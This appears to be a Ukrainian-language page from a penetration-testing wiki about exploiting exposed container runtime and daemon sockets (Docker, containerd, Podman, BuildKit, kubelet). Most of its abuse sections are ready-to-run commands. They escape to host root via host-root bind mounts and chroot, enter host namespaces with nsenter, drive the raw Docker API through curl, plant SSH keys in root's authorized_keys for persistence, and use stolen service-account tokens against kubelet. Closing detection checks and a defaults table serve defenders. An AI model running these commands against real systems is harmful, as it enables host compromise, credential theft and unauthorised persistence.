# Відкриття Runtime API та daemon

{{#include ../../../banners/hacktricks-training.md}}

## Модель доступу до daemon

Багато реальних компрометацій контейнерів взагалі не починаються з escape з namespace. Вони починаються з доступу до control plane runtime. Якщо workload може взаємодіяти з `dockerd`, `containerd`, CRI-O, Podman або kubelet через змонтований Unix socket чи відкритий TCP listener, attacker може отримати можливість запросити новий container із розширеними privileges, змонтувати файлову систему host, приєднатися до host namespaces або отримати sensitive information про node. У таких випадках runtime API є справжньою security boundary, а його компрометація функціонально майже рівнозначна компрометації host.

Саме тому exposure runtime socket слід документувати окремо від kernel protections. Container зі звичайними seccomp, capabilities і MAC confinement усе ще може бути за один API call від компрометації host, якщо `/var/run/docker.sock` або `/run/containerd/containerd.sock` змонтовано всередині нього. Kernel isolation поточного container може працювати саме так, як задумано, тоді як management plane runtime залишається повністю exposed.

## Моделі доступу до daemon

Docker Engine традиційно надає доступ до свого privileged API через локальний Unix socket за адресою `unix:///var/run/docker.sock`. Історично він також був доступний віддалено через TCP listeners, наприклад `tcp://0.0.0.0:2375`, або TLS-protected listener на `2376`. Відкриття daemon віддалено без надійного TLS і client authentication фактично перетворює Docker API на remote root interface.

containerd, CRI-O, Podman і kubelet відкривають подібні high-impact surfaces. Назви та workflows відрізняються, але логіка залишається тією самою. Якщо interface дає caller змогу створювати workloads, монтувати host paths, отримувати credentials або змінювати running containers, цей interface є privileged management channel, і до нього слід ставитися відповідним чином.

Поширені локальні paths, які варто перевірити:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Старіші або спеціалізованіші стеки також можуть відкривати такі endpoints, як `dockershim.sock`, `frakti.sock` або `rktlet.sock`. У сучасних середовищах вони трапляються рідше, але в разі виявлення до них слід ставитися з такою самою обережністю, оскільки вони є поверхнями керування runtime, а не звичайними сокетами застосунків.

## Безпечний віддалений доступ

Якщо daemon потрібно відкрити за межами локального сокета, з’єднання слід захистити за допомогою TLS і, бажано, взаємної автентифікації, щоб daemon перевіряв клієнта, а клієнт — daemon. Стара практика відкриття Docker daemon через звичайний HTTP заради зручності є однією з найнебезпечніших помилок в адмініструванні контейнерів, оскільки поверхня API достатньо потужна, щоб безпосередньо створювати привілейовані контейнери.

Історичний шаблон конфігурації Docker виглядав так:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
На хостах на основі systemd взаємодія з daemon також може відбуватися через `fd://`, тобто процес успадковує попередньо відкритий socket від systemd, а не прив’язує його безпосередньо самостійно. Важливий висновок полягає не в точному синтаксисі, а в наслідках для безпеки. Щойно daemon починає прослуховувати щось за межами локального socket із суворо налаштованими дозволами, безпека транспортного рівня та автентифікація клієнтів стають обов’язковими, а не додатковим hardening.

## Abuse

Якщо runtime socket присутній, перевірте, який саме це socket, чи існує сумісний клієнт і чи можливий доступ через raw HTTP або gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ці команди корисні, оскільки дають змогу відрізнити недоступний шлях, змонтований, але недоступний socket і активний привілейований API. Якщо клієнт виконується успішно, наступне питання полягає в тому, чи може API запустити новий контейнер із host bind mount або спільним використанням host namespace.

### Коли клієнт не встановлено

Відсутність `docker`, `podman` або іншого зручного CLI не означає, що socket безпечний. Docker Engine працює через HTTP поверх свого Unix socket, а Podman надає як Docker-сумісний API, так і Libpod-native API через `podman system service`. Це означає, що мінімального середовища лише з `curl` може бути достатньо для взаємодії з daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Це важливо під час post-exploitation, оскільки захисники іноді видаляють звичні клієнтські бінарні файли, але залишають змонтований management socket. На хостах Podman пам’ятайте, що шлях із високою цінністю відрізняється для rootful і rootless розгортань: `unix:///run/podman/podman.sock` для rootful service instances і `unix://$XDG_RUNTIME_DIR/podman/podman.sock` для rootless.

### Повний приклад: Docker Socket To Host Root

Якщо `docker.sock` доступний, класичний escape полягає в запуску нового контейнера, який монтує кореневу файлову систему хоста, а потім виконує `chroot` у ній:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Це забезпечує безпосереднє виконання з правами root хоста через Docker daemon. Вплив не обмежується читанням файлів. Опинившись усередині нового контейнера, attacker може змінювати файли хоста, збирати credentials, встановлювати persistence або запускати додаткові привілейовані workloads.

### Повний приклад: Docker Socket до просторів імен хоста

Якщо attacker надає перевагу входу до просторів імен замість доступу лише до файлової системи:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Цей шлях досягає host, запитуючи runtime створити новий container із явним доступом до host namespaces, а не використовуючи вразливість у поточному container.

### Docker Socket Persistence Pattern

Керування runtime також можна використовувати для persistence замість одноразового shell. Загальний шаблон полягає у створенні допоміжного container із host mount, записуванні матеріалів авторизованого доступу або startup hook у змонтовану файлову систему host, а потім перевірці, що host їх використовує.

Прикладова форма:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Та сама ідея може застосовуватися до systemd units, cron fragments, файлів запуску застосунків або SSH keys — залежно від того, що оператор хоче довести. Важливо те, що persistent change виконується через host-level filesystem authority runtime daemon, а не завдяки додатковим привілеям в оригінальному container.

### Raw Docker API Helper Pivot

Якщо Docker CLI відсутній, той самий host-mount helper flow можна виконати через HTTP поверх Unix socket. Загальний flow такий: підтвердити API, створити helper container із host bind mount, запустити його, створити exec instance і запустити цей exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Фінальний запит `/exec/<id>/start` залежить від отриманого exec ID, але безпековий аспект не залежить від точного JSON plumbing: прямого доступу до API rootful Docker daemon достатньо, щоб запросити потужніше допоміжне робоче навантаження.

### Повний приклад: сокет containerd

Змонтований сокет `containerd` зазвичай так само небезпечний:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Якщо доступний клієнт, більш схожий на Docker, `nerdctl` може бути зручнішим за `ctr`, оскільки він надає знайомі прапорці, такі як `--privileged`, `--pid=host` і `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Наслідком знову є компрометація host. Навіть якщо Docker-specific tooling відсутній, інший runtime API все одно може надавати такі самі адміністративні можливості. На Kubernetes nodes `crictl` також може бути достатнім для reconnaissance та взаємодії з containers, оскільки він безпосередньо взаємодіє з CRI endpoint.

### BuildKit Socket

`buildkitd` легко не помітити, оскільки його часто сприймають як "лише build backend", але daemon усе одно є privileged control plane. Доступний `buildkitd.sock` може дозволити attacker виконувати довільні build steps, перевіряти worker capabilities, використовувати local contexts із compromised environment і запитувати небезпечні entitlements, як-от `network.host` або `security.insecure`, якщо daemon налаштовано на їх дозвіл.

Корисні перші взаємодії:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Якщо daemon приймає запити на build, перевірте, чи доступні небезпечні entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Точний вплив залежить від конфігурації daemon, але rootful BuildKit service із permissive entitlements — це не нешкідлива зручність для розробників. Сприймайте його як ще одну високопріоритетну адміністративну поверхню, особливо на CI runners і спільних build nodes.

### Kubelet API Over TCP

kubelet не є container runtime, але він усе одно є частиною площини керування node і часто розглядається в межах тієї самої trust boundary. Якщо secure port kubelet `10250` доступний із workload або якщо exposed node credentials, kubeconfigs чи proxy rights, attacker може отримати змогу перелічити Pods, отримати logs або виконувати commands у node-local containers, не взаємодіючи з admission path Kubernetes API server.

Почніть із недорогого discovery:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Якщо kubelet або шлях проксі API-server авторизує `exec`, клієнт із підтримкою WebSocket може перетворити це на виконання коду в інших контейнерах на вузлі. Саме тому `nodes/proxy` лише з дозволом `get` є небезпечнішим, ніж може здатися: запит усе одно може досягти кінцевих точок kubelet, які виконують команди, а такі прямі взаємодії з kubelet не відображаються у звичайних журналах аудиту Kubernetes.

## Перевірки

Мета цих перевірок — з’ясувати, чи може контейнер отримати доступ до будь-якої площини керування, яка мала залишатися за межами межі довіри.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Що тут цікавого:

- Підключений runtime socket зазвичай є прямим адміністративним примітивом, а не просто розкриттям інформації.
- TCP listener на `2375` без TLS слід розглядати як умову для віддаленого компрометації.
- Змінні середовища на кшталт `DOCKER_HOST` часто свідчать, що workload навмисно спроєктовано для взаємодії з runtime хоста.

## Runtime Defaults

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Локальний Unix socket за замовчуванням | `dockerd` прослуховує локальний socket, а daemon зазвичай працює з root privileges | підключення `/var/run/docker.sock`, відкриття `tcp://...:2375`, слабкий або відсутній TLS на `2376` |
| Podman | CLI без daemon за замовчуванням | Для звичайного локального використання не потрібен довготривалий привілейований daemon; API sockets все одно можуть бути відкриті, якщо ввімкнено `podman system service` | відкриття `podman.sock`, широке розгортання service, rootful API use |
| containerd | Локальний привілейований socket | Адміністративний API відкритий через локальний socket і зазвичай використовується інструментами вищого рівня | підключення `containerd.sock`, широке надання доступу до `ctr` або `nerdctl`, відкриття привілейованих namespaces |
| CRI-O | Локальний привілейований socket | CRI endpoint призначений для довірених компонентів, локальних для node | підключення `crio.sock`, відкриття CRI endpoint для недовірених workloads |
| Kubernetes kubelet | Локальний management API node | Kubelet не повинен бути широко доступним із Pods; залежно від authn/authz доступ може розкрити стан pods, credentials і функції виконання | підключення kubelet sockets або certs, слабка kubelet auth, host networking разом із доступним kubelet endpoint |

## References

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
